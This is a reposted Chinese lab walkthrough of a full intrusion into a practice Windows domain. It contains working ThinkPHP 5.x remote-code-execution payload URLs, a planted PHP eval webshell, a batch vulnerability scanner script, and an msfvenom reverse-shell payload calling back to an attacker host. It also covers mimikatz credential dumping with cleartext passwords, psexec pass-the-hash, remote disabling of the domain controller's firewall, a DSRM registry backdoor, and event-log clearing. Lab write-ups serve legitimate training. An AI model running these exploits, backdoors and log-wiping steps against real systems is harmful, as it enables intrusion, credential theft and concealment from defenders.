> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aQHD2QatC5U8XrhjlVOVdA)

实战步骤 & 知识点

```
前言
环境搭建
  web服务器渗透
  nmap探测端口
  thinkphp getshell
  thinkphp批量检测
内网信息搜集
内网渗透
  上线msf
  信息搜集
  获取凭证
  思路
内网横向移动
  MS17-010尝试
  psexec尝试
  ipc连接关闭域控防火墙
  psexec尝试*2
  登录远程桌面
权限维持
  DSRM后门
  日志清除
```

**1 前言**

在内网渗透的过程中思路才是最重要的，本次内网渗透的主机虽然不多，主要还是锻炼自己内网渗透的一个思想。  

**2 环境搭建**

**靶场：  
**

win7(内)：192.168.138.136

win7(外)：192.168.10.25

**域内主机：**

win2008：192.168.138.138

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRxyib3VSVVCW38CdVMMByQzrlBLWj4sYmPGSC49O46OfzuJ3VO8mhCiag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRPJdwibZw0f3t57UBPXTtbugyQIVueAtJnOE0ewuwofpzfh3Vp6eC1vw/640?wx_fmt=png)

**3 web 服务器渗透**

**nmap 探测端口**  

```
nmap -T4 -sC -sV 192.168.10.25
```

这里可以看到几个主要的端口，例如 80、135、139、445，这里首先就可以想到可以利用的点有 ipc、smb

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRWibAHkZZUv7SGTNoKlTpclDPnLSD0ic4yqPRh0hOoibOBY5iaQBdvscXng/640?wx_fmt=png)

开了 80 端口，尝试访问 web 地址，老笑脸人了，而且还是 5.x 版本，洞还是比较多

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRFuS7rA7tnKx0VwoGlBqrNRtqJVVLtP9xDNdFXJxicznxNJ000wUyINw/640?wx_fmt=png)

为了确定具体版本，这里先使用报错查看，发现这里的版本为 5.0.22，如果没记错的话这里是有一个 tp 远程命令执行漏洞的

**漏洞描述：  
**

> 由于 thinkphp 对框架中的核心 Requests 类的 method 方法提供了表单请求伪造，该功能利用 $_POST['_method'] 来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置 $_POST['_method']='__construct'而让该类的变量被覆盖。攻击者利用该方式将 filter 变量覆盖为 system 等函数名，当内部进行参数过滤时便会进行执行任意命令。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRlGQxTwZUvzJyR8MCMa9MheZoAdOEdW6Fr5ty3eMquwicAWNJxuwebYQ/640?wx_fmt=png)

**thinkphp getshell**
---------------------

这里我首先在 kali 里面找一下有没有相关的漏洞

```
searchsploit thinkphp
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRmhl04ib9eDOpGZBcJG5gkYAOekKQwiaDvModziaMlTUx7bWqjice4nYV2w/640?wx_fmt=png)

可以看到这里有一个 5.x 远程执行漏洞，这里直接进入这个文件夹查看一下 txt 列出来的 payload

```
cd /usr/share/exploitdb/exploits/php/webapps
cat 46150.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRGm11UxwkfHcQTQsVmfEibpys9rtuVVXFmic2kIltH4YialJPzU3m1y12A/640?wx_fmt=png)

找到对应版本后 fuzz 以下 payload，这个是列出数据库名字，这里看到数据库名为 root

```
192.168.10.25/thinkphp/public/?s=.|think\config/get&name=database.username
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRibXz8ympvJ78ibQO3vicl76HkYiaXEm2dLUyGJhUlhH3qzKEzy5BiaOeYeg/640?wx_fmt=png)

这个 payload 应该是列出数据库密码，但是这里没有打出来

```
192.168.10.25/thinkphp/public/?s=.|think\config/get&name=database.password
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRqSFeXNfClSGqia8pA26AgSTfraCicYEP0cnMOVtP9WXD6bAs0slictPng/640?wx_fmt=png)

这里打出 phpinfo

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRqHGibCO77Tbpib9AANNmYa1VrbdrKlMrvIibx7FL5ksmYFgZGPzv2cHZA/640?wx_fmt=png)

传参看一下当前权限为 administrator

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRXg7L3QBuyf6k7nYgcIuvSxia5303ic1oiccrQ1tjLGxkkUggUvibyJjpZg/640?wx_fmt=png)

看一下 ip 情况，双网卡，那么大概率有域环境

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ipconfig
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRWt9gWbFtR3WA9ex9d5cksa5ryEvhLwlclCu7zhicKOl54kGlicyibj2SA/640?wx_fmt=png)

看一下进程，发现无杀软那么尝试不用免杀直接写 webshell

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist /svc
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRaQiatGshulcVbP1ic9PMhbsibSBhiaWnzR60RFYnib77DMJRlSkDx3BFq5Q/640?wx_fmt=png)

这里直接尝试 echo 写一个一句话木马进去，这里因为之前查看过没有杀软跟安全狗，这里就不需要做免杀处理

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[cmd]);?>" > connect.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvR3YUuuZzxCQiaMhZRI6dNONVUjkRtceSqdmhUk3iaqQZslicOGP4Ys6Bhw/640?wx_fmt=png)

这里用 dir 验证一下是否写入成功

```
192.168.10.25/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRDXDBcF5U0P2fm40TSF1Yd4ufklkvRd5w4lFDTGhwU0QbTGw63HQ0iaA/640?wx_fmt=png)

使用蚁剑连接成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRfO6iakCtsDPjU6lGVdWQ8NrINjBMzsKAXLoA5CQkVRnYytMsBu4Aclw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRmFcIAJtwy06WiaBhbticibYYcvAXwvZz3zw9HEIfVSiaAXvY1ehUC2yKRA/640?wx_fmt=png)

**thinkphp 批量检测**
-----------------

这里我思考了一个问题，thinkphp 的版本这么多，如果 kali 里面的漏洞库没有，而在搜索引擎上去搜索又太耗费时间，有没有一个批量检测 thinkphp 漏洞的脚本呢？

这里我找到了一个 thinkphp 漏洞批量检测的脚本

```
# !/usr/bin/env python
# -*- coding: utf-8 -*-

# name: thinkphp远程代码检测
# description: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
import re
import sys
import requests
import queue
import threading
from bs4 import BeautifulSoup
class thinkphp_rce(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)
        self.q = q
    def run(self):
        while not self.q.empty():
            url=self.q.get()
            headers = {"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"}
            payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
            vulnurl = url + payload
            try:
                response = requests.get(vulnurl, headers=headers, timeout=3, verify=False, allow_redirects=False)

                soup = BeautifulSoup(response.text,"lxml")
                if 'PHP Version' in str(soup.text):
                    print ('[+] Remote code execution vulnerability exists at the target address')
                    print ('[+] Vulnerability url address ' + vulnurl)
                    with open('target.txt','a') as f1:
                        f1.write(vulnurl+'\n')
                    f1.close()
                else:
                    print ('[-] There is no remote code execution vulnerability in the target address')
            except:
                print ('[!] Destination address cannot be connected')
def urlget():
    with open('url.txt','r')as f:
        urls=f.readlines()
        for tmp in urls:
            if '//' in tmp:
                url=tmp.strip('\n')
                urlList.append(url)
            else:
                url='http://'+tmp.strip('\n')
                urlList.append(url)
        return(urlList)
    f.close()

if __name__=="__main__":
    print('''----------------扫描开始-------------------

*Made by  :tdcoming
*For More :https://t.zsxq.com/Ai2rj6E
*MY Heart :https://t.zsxq.com/A2FQFMN

              _______   _                         _               
             |__   __| | |                       (_)              
                | |  __| |  ___  ___   _ __ ___   _  _ __    __ _ 
                | | / _` | / __|/ _ \ | '_ ` _ \ | || '_ \  / _` |
                | || (_| || (__| (_) || | | | | || || | | || (_| |
                |_| \__,_| \___|\___/ |_| |_| |_||_||_| |_| \__, |
                                                             __/ |
                                                            |___/ 
            ''')
    urlList=[]
    urlget()
    threads = []
    threads_count = 10
    q=queue.Queue()
    for url in urlList:
        q.put(url)
    for i in range(threads_count):
        threads.append(thinkphp_rce(q))
    for i in threads:
        i.start()
    for i in threads:
        i.join()
```

这里的使用方法很简单：将要检测的目标放在 url.txt 里面，如果存在漏洞的地址将自动生成一个 target.txt 文本保存

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRIe3qcOF7AzL4syZmZy8vxaAfMFBXtYVSAjpeCucjEGRqiaJicRyPhw7w/640?wx_fmt=png)

**4 内网信息搜集**

这里使用蚁剑的命令窗口搜集一下本机信息，为 administrator 权限 + 双网卡  

```
whoami
ipconfig
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRibSgibvicwZTJJkJYeBcuzoWn2Id3MO2mnl217dHia4Bndo3Dxb7hj9Hcg/640?wx_fmt=png)

查看一下域相关信息

```
net view
net config workstation
net user /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvR5utiaYrGPGZvHIg2gLmKLib2cibZzRlMXOOnA9WOw9exr8fSZPUu6PQMQ/640?wx_fmt=png)

**5 内网渗透**

**上线 msf**  

msf 生成一个 abc.exe

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.11 LPORT=4444 -f exe > abc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRQQuftIjYSrMcJnib83iaVPicWdzu2EicWKXEKWhKfHx849DRfAXKlzHdbw/640?wx_fmt=png)

使用蚁剑上传到靶机上

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRXquF58a3Wt2WgYvBenGcAoT0icRMgGL7QGCdicJUAHLpPYf6ia4QsjndQ/640?wx_fmt=png)

这里因为没有杀软不用做免杀，直接命令行执行即可

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRfvA83OQkpGuRuhFNkaqvOoDv1vEmWLzMZRWjIFfaEx6lbGNVF8xueQ/640?wx_fmt=png)

msf 开启监听即可上线

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvREnnFTajiaa4UpaeEIRbzUhfBUYRdM6ZcpXiaOOsAVV1cX62zc1HInvTQ/640?wx_fmt=png)

**权限提升**

使用 getsystem 提权到 system，这里因为是靶场的原因 getsystem 比较容易执行成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRiaic09gibHAjMvfDZ3c9XoW0qhTZO2JCLakvCA6xy8psLWWXVJb2BiaIRQ/640?wx_fmt=png)

提权后获取一个 windows 环境下的 shell 继续对域进行信息搜集

```
chcp 65001
net user /domain
net group "domain computers" /domain
net group "domain controllers" /domain
net group "domain admins" /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRMb05cjGguroichyA738hZQUibiaA03TGzNGBrzgs8LNU69GnibS17FTibcA/640?wx_fmt=png)  

靶机存在一个名为 “sun” 的域环境，只有一个域控，这里我直接 ping 一下域控得到域控 ip 为 192.168.138.138

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRZjsM6Jq2RtZ6FZiaIibJ0sPWLsFFm2iawfQrLDAV2dTop89FxfHv1GbAw/640?wx_fmt=png)

**获取凭证**
--------

这里因为有两个网段就先把路由添加上方便后续操作

```
# msf操作
route add 192.168.138.0 255.255.255.0 2
route print    

# session操作
run autoroute -s 192.168.138.0/24
run autoroute -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRkGVZhkTdawBOg1ibDmTWbWIfNWZCf2mdWoHbO5joHQof6u3S2XjLABg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRh1Htfm01dfQdATiaqD4ICIJXyKygWKbHqjSBUA4Gku1QzE4iaUBq08Hg/640?wx_fmt=png)

这里选择 session，使用 kiwi 来获取靶机密码，注意这里需要进行的一个操作为进程迁移，因为我们这里上线到 msf 的载荷是 32 位的 (即 x86)，这里需要找一个 64 位的(即 x64) 进行进程迁移才能使用 kiwi 获取靶机密码

```
sessions -i 2
load kiwi
kiwi_cmd privilege::debug
ps
migrate 1144
kiwi_cmd sekurlsa::logonPasswords
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRBsqc81Kj2qnwycZCE2Wv7Qhxfw7K1B9xIvWoXFghvdvT98pNvMxxgw/640?wx_fmt=png)

这里可以看到抓取到了一个域管的密码为`dc123.com`和一个靶机的密码`123.com`

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRV54bSz80Zn0icU9jShsgRa0gnNwtZ4eQvibshp7p5nLs9okYTrXAy9NQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRrnoPia5jQe7BqcL0VZib3IZZ2furOzxw8vLQJaaiaiaBgtrgkqla4RqBqA/640?wx_fmt=png)

**思路**
------

这里抓到了靶机和域管的密码，那么这里就可以用 pth 的方法进行横向移动，这是第一种方法；另外我们可以去检测一下在另一个网段的机器有什么漏洞可以利用，如 MS17-010、CVE-2020-0796 等等，利用漏洞的 exp 进行横向移动，这是第二种方法；因为我们之前在用 nmap 对端口进行扫描的时候是发现了 139 和 445 端口的，那么我们拿到了密码的情况下可以尝试使用 ipc + 计划任务的方式进行横向移动

**6 内网横向移动**

**MS17-010 尝试**

这里直接使用 ms17-010 的攻击模块进行尝试，这里其实应该先用扫描模块对处于另一网段的主机进行漏洞扫描，若存在永恒之蓝漏洞才继续使用 exp 模块进行攻击，这里我为了演示方便就直接上手 exp 模块进行攻击了

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRlyicUDeKsTh04f89ibUOibnyBoZahd83L0IBjZPY1A3ibR4awjq7R9MKRA/640?wx_fmt=png)

这里攻击可以看到，虽然靶机存在永恒之蓝漏洞但是 session 反弹不成功，这里是因为在 windows server2008 的情况下匿名管道是默认不开启的。

我们知道 psexec 的原理就是使用了管道，ipc 连接也同理。那么在匿名管带不开启的情况下永恒之蓝的连接是建立不上的。这里再说一下匿名管道的概念：

> 管道是 IPC 最基本的一种实现机制。我们都知道在 Linux 下 “一切皆文件”，其实这里的管道就是一个文件。管道实现进程通信就是让两个进程都能访问该文件。管道的特征：
> 
> ①只提供单向通信，也就是说，两个进程都能访问这个文件，假设进程 1 往文件内写东西，那么进程 2 就只能读取文件的内容。
> 
> ②只能用于具有血缘关系的进程间通信，通常用于父子进程建通信
> 
> ③管道是基于字节流来通信的
> 
> ④依赖于文件系统，它的生命周期随进程的结束结束（随进程）
> 
> ⑤其本身自带同步互斥效果

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRTqbVrb8yDbdJ3Qkv7WqzlibT8fGfv4oT6iayich0FjlL2USU9qEutPsIw/640?wx_fmt=png)

**psexec 尝试**
-------------

因为我们已经拿到了域管的帐号那么我们这里就直接使用 pth 的方法，即哈希传递，使用的是 psexec 模块，不过这个模块因为被使用太多导致已经被杀软列入了黑名单，如果这里有杀软存在的情况下 psexec 横向移动是会被拦截的。

设置参数如下所示，这里注意一下`SMBPass`这个地方也能够通过 hash 进行传递，也能够通过明文密码进行传递

```
use exploit/windows/smb/psexec
set rhost 192.168.138.138
set SMBDomain SUN
set SMBUser administrator
set SMBPass dc123.com
set payload windows/meterpreter/bind_tcp
run
```

这里可以看到 exp 已经利用了但是没有 session 反弹回来，这里我猜测是以为防火墙阻止了端口流量的进出，所以这里我们就需要通过 ipc 连接去关闭域控的防火墙

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRJHYuwdjOiaRq8FJVXzFgniaVPOeictgBtLkCUoEjiaHB7pPQtNAzIxVS4g/640?wx_fmt=png)

**ipc 连接关闭域控防火墙**
-----------------

这里的常规方法是使用 netsh 关闭域控防火墙，但是这里需要域控的管理员权限，所以在这里我们就直接使用 ipc 连接域控然后使用计划任务添加规则关闭防火墙

```
netsh advfirewall firewall add rule e:\f.exe" action=allownetsh advfirewall firewall delete rule 
```

将 session 挂在后台并与域控建立 ipc 连接

```
net use \\192.168.138.138\ipc$ dc123.com /user:administrator
```

这里可以看到连接已经建立成功了

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRXuHzJycGrkrFFlwltDhAwEmKic5AfaAsnkCFbJWTaTubzYJuCyxdA4g/640?wx_fmt=png)

利用 sc 创建计划任务立即启动关闭域控的防火墙，这里可以看到防火墙已经被关闭了

```
# 创建服务
sc \\192.168.138.138 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
# 立即启动服务
sc \\192.168.138.138 start unablefirewall
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvR4O1DwvlKrC1oAzFoP1rzdjNAcCKXVzcqMwgfoXtXciaxph7QGcCsGBg/640?wx_fmt=png)

**psexec 尝试 * 2**
-----------------

这时候我们再使用 psexec 进行横向移动就能够获得 session，至此我们就拿到了域控的权限

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRAOGFA9UkHlLnEyzSQeYSSbSe8pS8VkCGumGtc3CjsUOFSobFz8uEVA/640?wx_fmt=png)

这里看一下我们直接拿到的就是一个 system 权限的 session

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRfamn1WucaSt2h4IX9YYJqjyZ2eQ57jjYk29GdQnicCnxQ55zl2a9JFw/640?wx_fmt=png)

**登录远程桌面**
----------

这里我想登录远程桌面看看域控还有什么有价值的东西就可以使用 socks 代理正向进入内网，使用`socks_proxy`模块

```
use auxiliary/server/socks_proxt
set viersion 4a
run
```

这里还需要配置 proxychain 文件

```
socks4 192.168.10.11 1080
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRm1aVzhQLcI9hMWds0Evtj5ZS7Ts5jatXEjz3TVYictVoWnrzT4mmgzQ/640?wx_fmt=png)

添加一个内网网段的路由

```
run autoroute -s 192.168.138.0/24
run autoroute -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRLScFBR1gVK5iaxIPhJqGjicw2vF0icIgX5A3erw4ksPjJQGqA9UnMhAhA/640?wx_fmt=png)

然后使用 proxychain 命令即可登录远程桌面

```
proxychain4 rdesktop 192.168.138.138
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRia3RyqDRHQYYwXrgJLic2RuMq2kyGCtvciaMXH5llZM5EpKcGIcubsQicA/640?wx_fmt=png)

登录域控如图所示

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRFVIibHXhbPRWRf8gBmaoMlamibpdrDTpUqmuh3BTNT2X7EYrfYLGkB8A/640?wx_fmt=png)

**7 权限维持**

权限维持的方法有很多种，这里我挑了一个使用得不是很多的方法来进行练习加以巩固  

**DSRM 后门**
-----------

何为 DSRM 后门？

> DSRM 是 Windows 域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账号 (也就是 DSRM 账号)。DSRM 的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改 DSRM 密码最基本的方法是在 DC 上运行 ntdsutil 命令。

在渗透测试中，可以使用 DSRM 账号对域环境进行持久化操作。我们知道，每个 DC 都有本地管理员 (administrator) 账号和密码（与域管理员账号密码不同）。DSRM 账号可以作为每个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。

**注意：**该类持久化操作适用的服务器版本：Windows Server 2008 及以后版本的 Windows 服务器。

**在域控制器上，DSRM 账号的表现形式是本地的管理员 Administrator 用户，也就是说本地管理员 Administrator 用户等于 DSRM 账号。**

首先，为 DSRM 账号设置新密码。在域控制器（Windows 2008）的 cmd 中进入 ntdsutil，然后输入下面命令进行修改 DSRM 账户的密码：

```
ntdsutil    // 进入ntdsutil
set dsrm password    // 设置DSRM账户的密码
reset password on server null    // 在当前域控制器上恢复DSRM密码

<password>    // 输入新密码
<password>    // 重新输入新密码
q    //退出DSRM密码设置模式
q    // 退出ntdsutil
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRuoqtibJPKCPO6fJcicE99Ox5N9QrhHxCYIrz0PJeya5pkGf3bDMSh5icA/640?wx_fmt=png)

然后再使用 kiwi 抓取 ntml hash

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRsuQocohZjgpufNpHztIbxia7wcGhwN5f5AHqepfqTqnkQ8AtS801Ogg/640?wx_fmt=png)

然后，我们修改域控主机的 DSRM 账户登录方式。在 Windows Server 2000 以后的版本操作系统中，对 DSRM 使用控制台登录域控制器进行了限制。我们可以在以下注册表位置中新建 DsrmAdminLogonBehavior 项进行设置，将该新建的项中的值设为 0、1、2 可以分别设置不同的 DSRM 账户登录方式：

```
HKLM:\System\CurrentControlSet\Control\Lsa\

0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号
1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器
2：在任何情况下，都可以使用DSRM管理员账号登录域控制器
```

如下所示，我们用 powershell 命令将 DSRM 的登录方式设置为 “2”，即在任何情况下，都可以使用 DSRM 管理员账号登录域控制器：

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -name "DsrmAdminLogonBehavior" -value 2 -propertyType DWORD
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRtzYNXsmiaFvLw0wLxmxUQibX3dVw3l0a8HXCB3SM6Qr7zzQVGlMF4IVg/640?wx_fmt=png)

使用 win7 上的 mimikatz 进行 hash 传递即可获取到域控权限

```
privilege::Debugsekurlsa::pth /domain:WIN-K6S18HH1766 /user:administrator /ntlm:a812e6c2defcb0a7b80868f9f3c88d09
```

**日志清除**
--------

日志清除有两种方法，一种是使用 kali 里面自带的命令进行日志清除

```
run event_manager -i
run event_manager -c
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRhvsJbIRUn71nagFibhABH1l7UMsXcYGRblUFJQ6VxT3j4fLjLlErJ4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRNlRCrQjibdhjGdItjvTKa6SgemcOtCBe9vU3NvTymS288t9qIwkkbaw/640?wx_fmt=png)

第二种方法则是进入服务器管理器自行清除

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd9GpwnuOicNMo5sjEg9BKvRTgds1sH5rRtDibsWotbPgnNLNSJhVD8LsfyH0TswPovOUYH75KuDLRQ/640?wx_fmt=png)

文章来源：先知社区

原文地址：https://xz.aliyun.com/t/9807

**推荐阅读：**

  

_**渗透实战系列**_

  

  

▶[【渗透实战系列】19 - 杀猪盘渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486570&idx=1&sn=0c20fbbf4adbeb5b555164438b3197f7&chksm=ce67a6f3f9102fe51b76482cd7d6bb644631ae469d8c1802956034077137ecd49ea56c8d2b1f&scene=21#wechat_redirect)

▶[【渗透实战系列】18 - 手动拿学校站点 得到上万人的信息（漏洞已提交）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486527&idx=1&sn=c1d4f51269e16d5dfdf110c91a8f19e4&chksm=ce67a6a6f9102fb07ad71789894824f553bd1207a3637da8a79b42868a9a9db900fb6d8aa358&scene=21#wechat_redirect)

▶[【渗透实战系列】|17 - 巧用 fofa 对目标网站进行 getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486499&idx=1&sn=7b8c8acc40e1281f1e388f799e7d2229&chksm=ce67a6baf9102facdd7d574719c51e33521308d9b76f53e5462c59674c9d38f18f213e8b1920&scene=21#wechat_redirect)

▶[【渗透实战系列】｜16 - 裸聊 APP 渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486466&idx=1&sn=121b62ef2740e8474119c3914d363e4c&chksm=ce67a69bf9102f8deac87602cbb4504f9a59336fb0113f728164c65048d0962f92dd2dd66113&scene=21#wechat_redirect)

▶[【渗透实战系列】｜15 - 博彩网站（APP）渗透的常见切入点](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486411&idx=1&sn=e5227a9f252f797bf170353d18222d6a&chksm=ce67a152f9102844551cf537356b85a6920abb084d5c6a26f7f8aea6870f51208782ac246ee2&scene=21#wechat_redirect)

▶[【渗透实战系列】｜14 - 对诈骗（杀猪盘）网站的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486388&idx=1&sn=cfc74ce3900b5ae89478bab819ede626&chksm=ce67a12df910283b8bc136f46ebd1d8ea59fcce80bce216bdf075481578c479fefa58973d7cb&scene=21#wechat_redirect)

▶[【渗透实战系列】｜13-waf 绕过拿下赌博网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486335&idx=1&sn=4cb172171dafd261c287f5bb90c35249&chksm=ce67a1e6f91028f08de759e1f8df8721f6c5a1e84d8c5f0948187c0c5b749fa2acdd4228b8e7&scene=21#wechat_redirect)

▶[【渗透实战系列】｜12 - 渗透实战， 被骗 4000 花呗背后的骗局](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486245&idx=1&sn=ebfcf540266643c0d618e5cd47396474&chksm=ce67a1bcf91028aa09435781e951926067dcf41532dacf9f6d3b522ca2df1be8a3c8551c1672&scene=21#wechat_redirect)

▶[【渗透实战系列】｜11 - 赌博站人人得而诛之](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486232&idx=1&sn=301810a7ba60add83cdcb99498de8125&chksm=ce67a181f9102897905ffd677dafeb90087d996cd2e7965300094bd29cba8f68d69f675829be&scene=21#wechat_redirect)

▶[【渗透实战系列】|10 - 记某色 X 商城支付逻辑漏洞的白嫖（修改价格提交订单）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486060&idx=1&sn=a4b977e9e3bbfe7b2c9ec479942e615c&chksm=ce67a0f5f91029e30c854eb2f71173efe925a38294fd39017708abcf4deea5c2b25dee518ebf&scene=21#wechat_redirect)

▶[【渗透实战系列】|9 - 对境外网站开展的一次 web 渗透实战测试（非常详细，适合打战练手）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486042&idx=1&sn=4022c7f001ca99dc6837d51b759d5104&chksm=ce67a0c3f91029d5f1ac9dc24d23cb390630db1cc3f8e76398cf097a50e29e0b98e9afcb600a&scene=21#wechat_redirect)

